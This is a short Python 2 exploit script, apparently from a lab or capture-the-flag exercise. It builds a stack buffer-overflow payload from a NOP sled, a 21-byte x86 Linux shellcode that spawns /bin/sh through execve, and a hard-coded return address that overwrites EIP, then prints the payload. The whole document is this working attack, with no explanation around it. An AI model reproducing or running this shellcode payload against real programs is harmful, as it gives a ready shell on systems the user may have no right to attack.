#!/usr/bin/python 
import sys
from io import StringIO
import struct


shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

EIP = struct.pack("I", 0xffffcf60)
NOP = "\x90" * (48 - 21)

print NOP + shellcode + EIP
